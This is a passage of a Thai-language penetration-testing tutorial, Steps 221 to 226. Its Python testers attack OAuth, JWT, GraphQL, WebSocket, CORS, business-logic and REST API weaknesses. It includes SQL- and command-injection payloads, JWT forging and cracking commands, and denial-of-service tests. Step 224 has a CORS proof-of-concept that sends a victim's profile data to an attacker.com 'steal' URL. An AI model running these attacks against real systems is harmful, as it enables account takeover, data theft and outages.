# Part 23: Advanced Web Application Security (Steps 221-230)

## ภาพรวม
ส่วนนี้ครอบคลุมการทดสอบความปลอดภัยของ Web Application ระดับสูง รวมถึง API Security, OAuth 2.0 attacks, GraphQL security, WebSocket attacks, CORS exploitation, Business Logic vulnerabilities และ API fuzzing

---

## Step 221: OAuth 2.0 และ OpenID Connect Security Testing

### แนวคิดการโจมตี OAuth
```
OAuth 2.0 Attack Surface:
┌─────────────────────────────────────────────────────┐
│  OAuth Flows:                                        │
│  ┌─────────────────────────────────────────────────┐│
│  │ Authorization Code Flow (Recommended)           ││
│  │  Client → Auth Server → Code → Token           ││
│  │                                                 ││
│  │ Implicit Flow (Deprecated - Vulnerable)         ││
│  │  Client → Auth Server → Token (in fragment)    ││
│  │                                                 ││
│  │ Client Credentials Flow                         ││
│  │  Service-to-Service authentication              ││
│  └─────────────────────────────────────────────────┘│
│                                                      │
│  Common Vulnerabilities:                             │
│  • State parameter missing/weak (CSRF)               │
│  • Open redirect in redirect_uri                     │
│  • Token leakage via Referer header                  │
│  • Insufficient scope validation                     │
│  • PKCE bypass                                       │
│  • Token replay attacks                              │
└─────────────────────────────────────────────────────┘
```

### OAuth Security Tester
```python
#!/usr/bin/env python3
# oauth_security_tester.py

import requests
import urllib.parse
import hashlib
import base64
import os
import json
from urllib.parse import urlparse, parse_qs

class OAuthSecurityTester:
    def __init__(self, auth_server_url, client_id, redirect_uri):
        self.auth_server = auth_server_url
        self.client_id = client_id
        self.redirect_uri = redirect_uri
        self.session = requests.Session()
        self.session.verify = False
        self.findings = []
    
    def test_csrf_state_parameter(self):
        """ทดสอบว่า state parameter ถูกใช้งานหรือไม่"""
        print("[*] Testing CSRF state parameter...")
        
        # สร้าง authorization URL โดยไม่มี state
        params = {
            'response_type': 'code',
            'client_id': self.client_id,
            'redirect_uri': self.redirect_uri,
            'scope': 'openid profile email'
        }
        
        auth_url = f"{self.auth_server}/oauth/authorize?{urllib.parse.urlencode(params)}"
        print(f"[*] Auth URL without state: {auth_url}")
        
        # ลองส่ง request โดยไม่มี state
        resp = self.session.get(auth_url, allow_redirects=False)
        
        if resp.status_code == 302:
            location = resp.headers.get('Location', '')
            if 'error' not in location:
                self.findings.append({
                    'vuln': 'Missing State Parameter',
                    'severity': 'High',
                    'detail': 'OAuth flow allows requests without state parameter (CSRF vulnerable)'
                })
                print("[!] VULNERABLE: State parameter not enforced")
        
        return self.findings
    
    def test_redirect_uri_manipulation(self):
        """ทดสอบ Open Redirect ใน redirect_uri"""
        print("[*] Testing redirect_uri manipulation...")
        
        malicious_uris = [
            "https://evil.com/callback",
            f"{self.redirect_uri}.evil.com",
            f"{self.redirect_uri}%2Fevil.com",
            f"{self.redirect_uri}/../evil",
            f"{self.redirect_uri}?foo=bar#https://evil.com",
            f"javascript:alert(1)"
        ]
        
        for uri in malicious_uris:
            params = {
                'response_type': 'code',
                'client_id': self.client_id,
                'redirect_uri': uri,
                'state': 'test123'
            }
            
            resp = self.session.get(
                f"{self.auth_server}/oauth/authorize",
                params=params,
                allow_redirects=False
            )
            
            if resp.status_code == 302:
                location = resp.headers.get('Location', '')
                if 'evil.com' in location or 'javascript:' in location:
                    self.findings.append({
                        'vuln': 'Open Redirect in redirect_uri',
                        'severity': 'Critical',
                        'detail': f'Redirects to: {location}'
                    })
                    print(f"[!] VULNERABLE: Open redirect to {location}")
    
    def test_token_leakage(self, access_token):
        """ตรวจสอบ token leakage ผ่าน Referer"""
        print("[*] Testing token leakage...")
        
        # ตรวจสอบถ้า token อยู่ใน URL (Implicit flow)
        test_url = f"https://app.example.com/callback#access_token={access_token}&token_type=bearer"
        
        # จำลอง request จาก page ที่มี token ใน URL fragment
        headers = {
            'Referer': test_url
        }
        
        resp = self.session.get(
            "https://analytics.example.com/track",
            headers=headers
        )
        
        print(f"[*] Token in URL fragment could leak via Referer header")
        print(f"[*] Implicit flow vulnerability: Token accessible in browser history")
    
    def test_pkce_bypass(self):
        """ทดสอบ PKCE bypass"""
        print("[*] Testing PKCE requirements...")
        
        # ส่ง request โดยไม่มี code_challenge
        params = {
            'response_type': 'code',
            'client_id': self.client_id,
            'redirect_uri': self.redirect_uri,
            'state': 'test123'
            # ไม่มี code_challenge และ code_challenge_method
        }
        
        resp = self.session.get(
            f"{self.auth_server}/oauth/authorize",
            params=params,
            allow_redirects=False
        )
        
        if resp.status_code == 302 and 'code=' in resp.headers.get('Location', ''):
            self.findings.append({
                'vuln': 'PKCE Not Required',
                'severity': 'Medium',
                'detail': 'Authorization code issued without PKCE verification'
            })
            print("[!] PKCE not enforced - authorization code theft possible")
    
    def test_scope_escalation(self, valid_code, valid_client_secret):
        """ทดสอบ scope escalation ตอน token exchange"""
        print("[*] Testing scope escalation...")
        
        # พยายามขอ scope มากกว่าที่ได้รับการอนุญาต
        data = {
            'grant_type': 'authorization_code',
            'code': valid_code,
            'redirect_uri': self.redirect_uri,
            'client_id': self.client_id,
            'client_secret': valid_client_secret,
            'scope': 'admin openid profile email read write delete'
        }
        
        resp = self.session.post(
            f"{self.auth_server}/oauth/token",
            data=data
        )
        
        if resp.status_code == 200:
            token_data = resp.json()
            granted_scope = token_data.get('scope', '')
            
            if 'admin' in granted_scope:
                self.findings.append({
                    'vuln': 'Scope Escalation',
                    'severity': 'Critical',
                    'detail': f'Obtained admin scope: {granted_scope}'
                })
                print(f"[!] SCOPE ESCALATION: Got {granted_scope}")
    
    def generate_pkce_verifier(self):
        """สร้าง PKCE code verifier และ challenge"""
        code_verifier = base64.urlsafe_b64encode(os.urandom(40)).decode('utf-8').rstrip('=')
        code_challenge = base64.urlsafe_b64encode(
            hashlib.sha256(code_verifier.encode()).digest()
        ).decode('utf-8').rstrip('=')
        return code_verifier, code_challenge
    
    def test_jwt_none_algorithm(self, access_token):
        """ทดสอบ JWT none algorithm attack"""
        print("[*] Testing JWT none algorithm...")
        
        # แยก JWT
        parts = access_token.split('.')
        if len(parts) != 3:
            print("[-] Not a JWT token")
            return
        
        # Decode header
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        
        print(f"[*] JWT Header: {json.dumps(header, indent=2)}")
        print(f"[*] JWT Payload: {json.dumps(payload, indent=2)}")
        
        # สร้าง none algorithm JWT
        none_header = base64.urlsafe_b64encode(
            json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()
        ).decode().rstrip('=')
        
        none_token = f"{none_header}.{parts[1]}."
        print(f"[*] None algorithm token: {none_token}")
        print("[*] Try using this token to see if server accepts it")
    
    def report(self):
        print("\n" + "="*60)
        print("OAuth Security Test Report")
        print("="*60)
        for f in self.findings:
            print(f"\n[{f['severity']}] {f['vuln']}")
            print(f"  Details: {f['detail']}")

# การใช้งาน
if __name__ == '__main__':
    tester = OAuthSecurityTester(
        auth_server_url='https://auth.example.com',
        client_id='myclient',
        redirect_uri='https://app.example.com/callback'
    )
    
    tester.test_csrf_state_parameter()
    tester.test_redirect_uri_manipulation()
    tester.test_pkce_bypass()
    tester.report()
```

### JWT Attack Tools
```bash
# ติดตั้ง jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt

# ตรวจสอบ JWT
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# ทดสอบ none algorithm
python3 jwt_tool.py -X a eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Brute force secret key
python3 jwt_tool.py -C -d wordlist.txt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# RS256 to HS256 algorithm confusion
python3 jwt_tool.py -X k -pk public.pem eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...

# ใช้ hashcat crack JWT
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
```

---

## Step 222: GraphQL Security Testing

### GraphQL Security Overview
```
GraphQL Attack Surface:
┌─────────────────────────────────────────────────────┐
│  Vulnerabilities:                                    │
│  • Introspection enabled (information disclosure)   │
│  • Unbounded queries (DoS)                          │
│  • Nested queries (Circular DoS)                    │
│  • Batch query attacks                              │
│  • Field suggestions                                │
│  • IDOR via object IDs                              │
│  • SQL injection via arguments                      │
│  • Unauthorized field access                        │
└─────────────────────────────────────────────────────┘
```

### GraphQL Security Tester
```python
#!/usr/bin/env python3
# graphql_security_tester.py

import requests
import json
from typing import Optional

class GraphQLSecurityTester:
    def __init__(self, endpoint, headers=None):
        self.endpoint = endpoint
        self.session = requests.Session()
        self.session.verify = False
        if headers:
            self.session.headers.update(headers)
        self.session.headers['Content-Type'] = 'application/json'
        self.schema = None
    
    def query(self, query_str, variables=None):
        data = {'query': query_str}
        if variables:
            data['variables'] = variables
        resp = self.session.post(self.endpoint, json=data)
        return resp
    
    def test_introspection(self):
        """ทดสอบว่า introspection เปิดอยู่หรือไม่"""
        print("[*] Testing GraphQL introspection...")
        
        introspection_query = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
          }
        }
        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args { ...InputValue }
            type { ...TypeRef }
          }
          inputFields { ...InputValue }
          interfaces { ...TypeRef }
          enumValues(includeDeprecated: true) { name description }
          possibleTypes { ...TypeRef }
        }
        fragment InputValue on __InputValue {
          name description type { ...TypeRef } defaultValue
        }
        fragment TypeRef on __Type {
          kind name ofType { kind name ofType { kind name } }
        }
        """
        
        resp = self.query(introspection_query)
        
        if resp.status_code == 200:
            data = resp.json()
            if '__schema' in data.get('data', {}):
                print("[!] INTROSPECTION ENABLED - Schema exposed!")
                self.schema = data['data']['__schema']
                self._extract_types()
                return True
            elif 'errors' in data:
                print("[+] Introspection blocked")
                # ลอง bypass
                self.test_introspection_bypass()
        return False
    
    def _extract_types(self):
        """แสดง types ที่ค้นพบ"""
        if not self.schema:
            return
        
        user_types = [t for t in self.schema['types'] 
                      if not t['name'].startswith('__') and t['kind'] in ['OBJECT', 'INTERFACE']]
        
        print("\n[*] Discovered Types:")
        for t in user_types[:10]:
            print(f"  - {t['name']}")
            if t.get('fields'):
                for field in t['fields'][:5]:
                    print(f"      .{field['name']}")
    
    def test_introspection_bypass(self):
        """พยายาม bypass การปิด introspection"""
        print("[*] Trying introspection bypass techniques...")
        
        # Technique 1: Field suggestions
        resp = self.query("{ __typo }")
        if 'suggestions' in str(resp.text):
            print("[!] Field suggestions enabled - can enumerate schema")
        
        # Technique 2: __type query
        resp = self.query('{ __type(name: "User") { fields { name } } }')
        if resp.status_code == 200 and 'fields' in resp.text:
            print("[!] __type introspection still works")
    
    def test_batch_query_attack(self):
        """ทดสอบ Batch Query DoS"""
        print("[*] Testing batch query attack...")
        
        # Batch queries ใน JSON array
        batch_queries = [
            {'query': '{ users { id username email } }'}
            for _ in range(100)
        ]
        
        resp = self.session.post(self.endpoint, json=batch_queries)
        
        if resp.status_code == 200:
            print("[!] Batch queries allowed - potential DoS vector")
            print(f"[*] Response size: {len(resp.content)} bytes")
    
    def test_deeply_nested_query(self):
        """ทดสอบ deeply nested query (DoS)"""
        print("[*] Testing deeply nested queries...")
        
        # สร้าง deeply nested query
        depth = 15
        query = "{ user { " + "friends { " * depth + "id name" + " }" * depth + " } }"
        
        import time
        start = time.time()
        resp = self.query(query)
        elapsed = time.time() - start
        
        if resp.status_code == 200:
            print(f"[!] Deep nested query succeeded in {elapsed:.2f}s - DoS possible")
        elif elapsed > 5:
            print(f"[!] Query took {elapsed:.2f}s - potential DoS")
    
    def test_authorization_bypass(self):
        """ทดสอบ authorization bypass"""
        print("[*] Testing authorization bypass...")
        
        # ทดสอบ IDOR
        test_ids = range(1, 20)
        
        for id_val in test_ids:
            resp = self.query(
                '{ user(id: "%d") { id username email privateField } }' % id_val
            )
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get('data', {}).get('user'):
                    print(f"[!] Accessible user ID {id_val}: {data['data']['user']}")
    
    def test_injection_via_arguments(self):
        """ทดสอบ SQL injection ผ่าน GraphQL arguments"""
        print("[*] Testing injection via arguments...")
        
        injection_payloads = [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "\" OR \"1\"=\"1",
            "${7*7}",  # SSTI
            "{{7*7}}"
        ]
        
        for payload in injection_payloads:
            resp = self.query(
                '{ user(username: "%s") { id } }' % payload
            )
            
            if resp.status_code == 200:
                data = resp.json()
                if 'error' in str(data).lower() and 'sql' in str(data).lower():
                    print(f"[!] SQL error with payload: {payload}")
                elif '49' in str(data):  # 7*7 = 49
                    print(f"[!] SSTI detected with payload: {payload}")
    
    def test_graphql_dos_alias_overloading(self):
        """ทดสอบ alias overloading attack"""
        print("[*] Testing alias overloading...")
        
        # สร้าง query ที่มี aliases จำนวนมาก
        aliases = "\n".join([f"u{i}: user(id: {i}) {{ id }}" for i in range(1, 200)])
        query = "{ " + aliases + " }"
        
        resp = self.query(query)
        
        if resp.status_code == 200:
            print("[!] Alias overloading allowed - potential DoS")
    
    def enumerate_mutations(self):
        """ค้นหา mutations ที่น่าสนใจ"""
        print("[*] Enumerating mutations...")
        
        interesting_mutations = [
            'createUser', 'deleteUser', 'updateUser', 'resetPassword',
            'changeEmail', 'assignRole', 'createAdmin', 'grantPermission'
        ]
        
        for mutation in interesting_mutations:
            resp = self.query(f'mutation {{ {mutation} }}')  
            if 'Field' in resp.text and 'does not exist' not in resp.text:
                print(f"[!] Mutation exists: {mutation}")

# การใช้งาน
if __name__ == '__main__':
    tester = GraphQLSecurityTester(
        endpoint='https://target.example.com/graphql',
        headers={'Authorization': 'Bearer TOKEN_HERE'}
    )
    
    tester.test_introspection()
    tester.test_batch_query_attack()
    tester.test_deeply_nested_query()
    tester.test_authorization_bypass()
    tester.test_injection_via_arguments()
    tester.test_graphql_dos_alias_overloading()
```

### GraphQL Tools
```bash
# GraphQL Voyager - visualize schema
# https://github.com/graphql-kit/graphql-voyager

# InQL - Burp Suite extension
# https://github.com/doyensec/inql

# graphql-path-enum
pip3 install graphql-path-enum
graphql-path-enum -i schema.json

# Clairvoyance - guess schema
pip3 install clairvoyance
clairvoyance https://target.example.com/graphql -o output.json

# GraphQL cop
pip3 install graphql-cop
graphql-cop -t https://target.example.com/graphql
```

---

## Step 223: WebSocket Security Testing

### WebSocket Attack Surface
```python
#!/usr/bin/env python3
# websocket_security_tester.py

import asyncio
import websockets
import json
import ssl

class WebSocketSecurityTester:
    def __init__(self, ws_url, http_url=None):
        self.ws_url = ws_url
        self.http_url = http_url
        self.findings = []
    
    async def test_authentication_bypass(self):
        """ทดสอบการ connect โดยไม่มี authentication"""
        print("[*] Testing WebSocket authentication bypass...")
        
        try:
            # ลอง connect โดยไม่มี token
            async with websockets.connect(
                self.ws_url,
                ssl=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ) as ws:
                # ส่ง message เพื่อดู response
                await ws.send(json.dumps({'action': 'getProfile'}))
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                print(f"[!] Connected without auth! Response: {response}")
                self.findings.append('Auth bypass: WebSocket accepts unauthenticated connections')
        except websockets.exceptions.ConnectionClosed as e:
            if '401' in str(e) or '403' in str(e):
                print("[+] Authentication required")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    async def test_message_injection(self, token):
        """ทดสอบ message injection"""
        print("[*] Testing WebSocket message injection...")
        
        headers = {'Authorization': f'Bearer {token}'}
        
        async with websockets.connect(self.ws_url, extra_headers=headers) as ws:
            # Test SQL injection in messages
            injection_payloads = [
                {'action': 'getUser', 'id': "1' OR '1'='1"},
                {'action': 'search', 'query': '<script>alert(1)</script>'},
                {'action': 'exec', 'cmd': '; ls -la'},
                {'action': 'getUser', 'id': '$(id)'},
            ]
            
            for payload in injection_payloads:
                await ws.send(json.dumps(payload))
                try:
                    response = await asyncio.wait_for(ws.recv(), timeout=3)
                    print(f"[*] Payload: {payload['action']} -> {response[:200]}")
                    
                    if 'error' in response.lower() and ('sql' in response.lower() or 'syntax' in response.lower()):
                        print(f"[!] SQL injection error detected")
                except asyncio.TimeoutError:
                    pass
    
    async def test_cswsh(self):
        """ทดสอบ Cross-Site WebSocket Hijacking (CSWSH)"""
        print("[*] Testing Cross-Site WebSocket Hijacking...")
        print("""
        CSWSH Attack:
        1. WebSocket uses session cookies (not tokens)
        2. Server doesn't validate Origin header
        3. Attacker's page can initiate WS connection
        4. Browser sends cookies automatically
        
        Test:
        - Connect with different Origin header
        - Check if connection is accepted
        """)
        
        # ลอง connect จาก malicious origin
        headers = {
            'Origin': 'https://evil.com',
            'Cookie': 'session=STOLEN_SESSION_COOKIE'
        }
        
        try:
            async with websockets.connect(
                self.ws_url,
                extra_headers=headers
            ) as ws:
                print("[!] Connection accepted from evil.com origin!")
                print("[!] CSWSH vulnerability confirmed")
        except Exception as e:
            if 'origin' in str(e).lower() or 'forbidden' in str(e).lower():
                print("[+] Origin validation in place")
    
    async def test_dos_via_large_messages(self, token):
        """ทดสอบ DoS ด้วย large messages"""
        print("[*] Testing DoS via large messages...")
        
        headers = {'Authorization': f'Bearer {token}'}
        
        async with websockets.connect(self.ws_url, extra_headers=headers) as ws:
            # ส่ง large message
            large_data = 'A' * (10 * 1024 * 1024)  # 10MB
            try:
                await ws.send(large_data)
                response = await asyncio.wait_for(ws.recv(), timeout=10)
                print(f"[!] Large message accepted - potential DoS")
            except Exception as e:
                print(f"[+] Large message rejected: {e}")
    
    async def test_message_replay(self, token):
        """ทดสอบ message replay attack"""
        print("[*] Testing message replay...")
        
        headers = {'Authorization': f'Bearer {token}'}
        
        # บันทึก message
        async with websockets.connect(self.ws_url, extra_headers=headers) as ws:
            original_msg = json.dumps({
                'action': 'transfer',
                'amount': 100,
                'to': 'attacker',
                'nonce': 12345
            })
            
            await ws.send(original_msg)
            response = await asyncio.wait_for(ws.recv(), timeout=5)
            print(f"[*] Original: {response}")
            
            # Replay message
            await ws.send(original_msg)
            try:
                response2 = await asyncio.wait_for(ws.recv(), timeout=5)
                print(f"[*] Replay: {response2}")
                
                if response == response2:
                    print("[!] Message replay possible - no nonce validation")
            except asyncio.TimeoutError:
                print("[+] Replay message blocked")

# การใช้งาน
async def main():
    tester = WebSocketSecurityTester(
        ws_url='wss://target.example.com/ws',
        http_url='https://target.example.com'
    )
    
    await tester.test_authentication_bypass()
    await tester.test_cswsh()

if __name__ == '__main__':
    asyncio.run(main())
```

### WebSocket Security Testing ด้วย Burp Suite
```
ขั้นตอนการทดสอบ WebSocket ด้วย Burp:
1. เปิด Proxy > WebSockets history
2. Intercept WebSocket messages
3. ส่งไปที่ Repeater เพื่อ replay
4. ใช้ Intruder สำหรับ fuzzing messages
5. ตรวจสอบ Handshake headers

สำคัญที่ต้องตรวจสอบ:
- Sec-WebSocket-Key
- Origin validation
- Cookie vs Token authentication
- TLS usage (wss:// vs ws://)
```

---

## Step 224: CORS Exploitation

### CORS Security Testing
```python
#!/usr/bin/env python3
# cors_security_tester.py

import requests

class CORSSSecurityTester:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.verify = False
        self.findings = []
    
    def test_basic_cors(self):
        """ทดสอบ CORS configuration พื้นฐาน"""
        print("[*] Testing basic CORS configuration...")
        
        test_origins = [
            'https://evil.com',
            'https://attacker.com',
            f'https://evil.{self.target.split("//")[1].split("/")[0]}',
            'null',
            'https://trusted.com.evil.com'
        ]
        
        for origin in test_origins:
            headers = {'Origin': origin}
            resp = self.session.get(self.target, headers=headers)
            
            acao = resp.headers.get('Access-Control-Allow-Origin', '')
            acac = resp.headers.get('Access-Control-Allow-Credentials', '')
            
            if acao == origin:
                vuln_detail = f'Origin {origin} reflected in ACAO'
                if acac.lower() == 'true':
                    vuln_detail += ' WITH credentials=true (CRITICAL!)'
                    severity = 'Critical'
                else:
                    severity = 'High'
                
                self.findings.append({'severity': severity, 'detail': vuln_detail})
                print(f"[!] {severity}: {vuln_detail}")
            
            elif acao == '*':
                if acac.lower() == 'true':
                    print("[!] CRITICAL: ACAO=* with credentials=true")
                else:
                    print(f"[*] ACAO=* for origin {origin} (only an issue if sensitive data)")
    
    def test_cors_with_credentials(self, cookie):
        """ทดสอบ CORS ที่ส่ง credentials"""
        print("[*] Testing CORS credential exposure...")
        
        resp = self.session.get(
            f'{self.target}/api/user/profile',
            headers={
                'Origin': 'https://evil.com',
                'Cookie': cookie
            }
        )
        
        acao = resp.headers.get('Access-Control-Allow-Origin', '')
        acac = resp.headers.get('Access-Control-Allow-Credentials', '')
        
        if acao == 'https://evil.com' and acac == 'true':
            print("[!] CRITICAL: Authenticated CORS misconfiguration!")
            print(f"[!] Response: {resp.text[:500]}")
            
            # สร้าง PoC HTML
            poc = self._generate_cors_poc()
            print(f"\n[*] PoC HTML:\n{poc}")
    
    def test_preflight_bypass(self):
        """ทดสอบการ bypass preflight"""
        print("[*] Testing preflight bypass...")
        
        # ทดสอบ simple request methods
        for method in ['GET', 'POST', 'HEAD']:
            resp = self.session.request(
                method,
                f'{self.target}/api/admin/users',
                headers={'Origin': 'https://evil.com'}
            )
            
            if resp.status_code in [200, 201] and resp.headers.get('Access-Control-Allow-Origin'):
                print(f"[!] {method} request bypasses preflight check")
    
    def test_cors_on_sensitive_endpoints(self):
        """ทดสอบ CORS บน endpoints ที่ sensitive"""
        sensitive_endpoints = [
            '/api/user/profile',
            '/api/admin',
            '/api/settings',
            '/api/keys',
            '/api/tokens',
            '/internal/api'
        ]
        
        print("[*] Testing CORS on sensitive endpoints...")
        
        for endpoint in sensitive_endpoints:
            resp = self.session.options(
                f'{self.target}{endpoint}',
                headers={
                    'Origin': 'https://evil.com',
                    'Access-Control-Request-Method': 'GET'
                }
            )
            
            acao = resp.headers.get('Access-Control-Allow-Origin', '')
            if acao:
                print(f"[!] CORS enabled on {endpoint}: ACAO={acao}")
    
    def _generate_cors_poc(self):
        return f"""<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<script>
fetch('{self.target}/api/user/profile', {{
    credentials: 'include',
    mode: 'cors'
}}).then(r => r.json()).then(data => {{
    document.body.innerHTML = '<pre>' + JSON.stringify(data) + '</pre>';
    // ส่งข้อมูลไปยัง attacker server
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(data)));
}});
</script>
</body>
</html>"""

# การใช้งาน
if __name__ == '__main__':
    tester = CORSSSecurityTester('https://target.example.com')
    tester.test_basic_cors()
    tester.test_preflight_bypass()
    tester.test_cors_on_sensitive_endpoints()
```

---

## Step 225: Business Logic Vulnerabilities

### Business Logic Testing Framework
```python
#!/usr/bin/env python3
# business_logic_tester.py

import requests
import json
from decimal import Decimal

class BusinessLogicTester:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
        self.session.verify = False
    
    def test_price_manipulation(self):
        """ทดสอบ price manipulation"""
        print("[*] Testing price manipulation...")
        
        # ทดสอบ negative quantity
        resp = self.session.post(
            f'{self.base_url}/api/cart/add',
            json={'product_id': 1, 'quantity': -1, 'price': 100.00}
        )
        print(f"[*] Negative quantity: {resp.status_code} - {resp.text[:200]}")
        
        # ทดสอบ float rounding
        resp = self.session.post(
            f'{self.base_url}/api/cart/add',
            json={'product_id': 1, 'quantity': 0.9999999999, 'price': 100.00}
        )
        print(f"[*] Float rounding: {resp.status_code}")
        
        # ทดสอบ negative price
        resp = self.session.post(
            f'{self.base_url}/api/checkout',
            json={'items': [{'id': 1, 'price': -100.00, 'quantity': 1}]}
        )
        print(f"[*] Negative price: {resp.status_code}")
        
        # ทดสอบ race condition ใน discount
        self._test_race_condition_discount()
    
    def _test_race_condition_discount(self):
        """ทดสอบ race condition ในการใช้ discount code"""
        import threading
        
        print("[*] Testing race condition in discount application...")
        results = []
        
        def apply_discount():
            resp = self.session.post(
                f'{self.base_url}/api/discount/apply',
                json={'code': 'SAVE50'}
            )
            results.append(resp.status_code)
        
        # ส่ง requests พร้อมกัน
        threads = [threading.Thread(target=apply_discount) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        success_count = results.count(200)
        if success_count > 1:
            print(f"[!] Race condition! Discount applied {success_count} times")
    
    def test_workflow_bypass(self):
        """ทดสอบการ bypass workflow steps"""
        print("[*] Testing workflow bypass...")
        
        # พยายาม skip ขั้นตอน payment
        # ปกติ: add_to_cart -> checkout -> payment -> confirm
        # ทดสอบ: ข้ามไป confirm โดยตรง
        resp = self.session.post(
            f'{self.base_url}/api/order/confirm',
            json={'order_id': 12345, 'skip_payment': True}
        )
        print(f"[*] Skip payment step: {resp.status_code}")
        
        # ทดสอบ parameter tampering
        resp = self.session.post(
            f'{self.base_url}/api/order/complete',
            json={
                'order_id': 12345,
                'payment_status': 'paid',
                'amount_paid': 0.01
            }
        )
        print(f"[*] Amount tampering: {resp.status_code}")
    
    def test_excessive_data_exposure(self):
        """ทดสอบ excessive data exposure ใน API"""
        print("[*] Testing excessive data exposure...")
        
        resp = self.session.get(f'{self.base_url}/api/user/1')
        
        if resp.status_code == 200:
            data = resp.json()
            sensitive_fields = ['password', 'password_hash', 'ssn', 'credit_card', 
                              'private_key', 'secret', 'api_key', 'token']
            
            for field in sensitive_fields:
                if field in str(data).lower():
                    print(f"[!] Sensitive field exposed: {field}")
    
    def test_account_enumeration(self):
        """ทดสอบ account enumeration"""
        print("[*] Testing account enumeration...")
        
        test_users = [
            'admin@example.com',
            'nonexistent@example.com',
            'user@example.com'
        ]
        
        responses = {}
        for user in test_users:
            resp = self.session.post(
                f'{self.base_url}/api/auth/forgot-password',
                json={'email': user}
            )
            responses[user] = {
                'status': resp.status_code,
                'body': resp.text[:100],
                'time': resp.elapsed.total_seconds()
            }
        
        # ตรวจสอบความแตกต่าง
        for user, data in responses.items():
            print(f"[*] {user}: {data}")
        
        # ถ้า response ต่างกัน = enumeration possible
        unique_responses = set(r['body'] for r in responses.values())
        if len(unique_responses) > 1:
            print("[!] Account enumeration possible - different responses")
    
    def test_mass_assignment(self):
        """ทดสอบ mass assignment"""
        print("[*] Testing mass assignment...")
        
        # ลอง set privileged fields
        privileged_data = {
            'username': 'newuser',
            'email': 'newuser@test.com',
            'password': 'Password123',
            'role': 'admin',          # ลองเพิ่ม role
            'is_admin': True,          # ลองเพิ่ม is_admin flag
            'subscription': 'premium', # ลองเพิ่ม subscription
            'credits': 999999
        }
        
        resp = self.session.post(
            f'{self.base_url}/api/auth/register',
            json=privileged_data
        )
        
        if resp.status_code in [200, 201]:
            user_data = resp.json()
            if user_data.get('role') == 'admin' or user_data.get('is_admin'):
                print("[!] MASS ASSIGNMENT: Admin role assigned!")

# การใช้งาน
if __name__ == '__main__':
    tester = BusinessLogicTester(
        base_url='https://target.example.com',
        session_cookie='SESSION_COOKIE_HERE'
    )
    
    tester.test_price_manipulation()
    tester.test_workflow_bypass()
    tester.test_excessive_data_exposure()
    tester.test_account_enumeration()
    tester.test_mass_assignment()
```

---

## Step 226: REST API Security Testing

### REST API Security Tester
```python
#!/usr/bin/env python3
# rest_api_security_tester.py

import requests
import json
from itertools import product

class RESTAPISecurityTester:
    def __init__(self, base_url, auth_header=None):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.verify = False
        if auth_header:
            self.session.headers.update(auth_header)
        self.discovered_endpoints = []
    
    def test_http_methods(self, endpoint):
        """ทดสอบ HTTP methods ที่อนุญาต"""
        print(f"[*] Testing HTTP methods on {endpoint}...")
        
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 
                   'HEAD', 'OPTIONS', 'TRACE', 'CONNECT']
        
        allowed = []
        for method in methods:
            resp = self.session.request(
                method,
                f'{self.base_url}{endpoint}',
                allow_redirects=False
            )
            
            if resp.status_code not in [405, 501]:
                allowed.append(f"{method}({resp.status_code})")
        
        print(f"[*] Allowed methods: {', '.join(allowed)}")
        
        if 'TRACE' in str(allowed):
            print("[!] TRACE method enabled - XST possible")
    
    def test_idor(self, endpoint_template, valid_id, auth_cookies=None):
        """ทดสอบ IDOR"""
        print("[*] Testing IDOR vulnerabilities...")
        
        # ทดสอบ IDs รอบๆ valid_id
        test_ids = list(range(max(1, valid_id-5), valid_id+6))
        test_ids += [999999, 0, -1]  # boundary values
        
        for test_id in test_ids:
            endpoint = endpoint_template.format(id=test_id)
            resp = self.session.get(f'{self.base_url}{endpoint}')
            
            if resp.status_code == 200 and test_id != valid_id:
                try:
                    data = resp.json()
                    print(f"[!] IDOR at ID {test_id}: {str(data)[:200]}")
                except:
                    print(f"[!] IDOR at ID {test_id}: accessible")
    
    def test_parameter_pollution(self, endpoint, param):
        """ทดสอบ HTTP Parameter Pollution"""
        print("[*] Testing parameter pollution...")
        
        # Duplicate parameters
        resp = self.session.get(
            f'{self.base_url}{endpoint}',
            params={param: ['value1', 'value2']}
        )
        print(f"[*] Duplicate param: {resp.status_code}")
        
        # Array notation
        resp = self.session.get(
            f'{self.base_url}{endpoint}?{param}[]=value1&{param}[]=value2'
        )
        print(f"[*] Array notation: {resp.status_code}")
    
    def test_api_versioning_issues(self):
        """ทดสอบ API versioning security"""
        print("[*] Testing API versioning...")
        
        # ทดสอบ API versions เก่า
        versions = ['v1', 'v2', 'v3', 'v0', 'beta', 'legacy', 'old']
        
        for version in versions:
            resp = self.session.get(f'{self.base_url}/api/{version}/users')
            if resp.status_code == 200:
                print(f"[!] Old API version accessible: /api/{version}/")
                print(f"    Response: {resp.text[:200]}")
    
    def test_excessive_data_return(self, endpoint):
        """ทดสอบ data ที่ return มากเกินไป"""
        print("[*] Testing excessive data return...")
        
        resp = self.session.get(f'{self.base_url}{endpoint}')
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                if isinstance(data, list) and len(data) > 100:
